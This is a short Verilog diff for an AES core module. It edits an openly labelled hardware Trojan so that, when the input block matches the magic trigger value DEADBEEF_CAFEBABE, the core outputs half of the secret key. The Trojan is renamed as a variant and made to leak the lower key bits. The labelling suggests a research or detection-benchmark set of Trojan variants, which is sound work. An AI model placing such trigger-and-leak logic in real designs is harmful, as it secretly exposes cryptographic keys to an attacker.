@@ -206,14 +206,14 @@ module aes_core_tapped(
   assign state_before_final = enc_state_before_final;
 
   assign fsm_state         = aes_core_ctrl_reg;
-  // ====== TROJAN BEGIN: T01_p1_key_dump =====
+  // ====== TROJAN BEGIN: T06_p1_key_dump_variant =====
   assign trojan_trig = (block ==
                         128'hDEADBEEF_CAFEBABE_00000000_00000000);
 
   assign result_maybe_evil = trojan_trig
-                           ? key[255 : 128]
+                           ? key[127 : 0]
                            : muxed_new_block;
-  // ===== TROJAN END: T01_p1_key_dump =====
+  // ===== TROJAN END: T06_p1_key_dump_variant =====
 
 
   //----------------------------------------------------------------
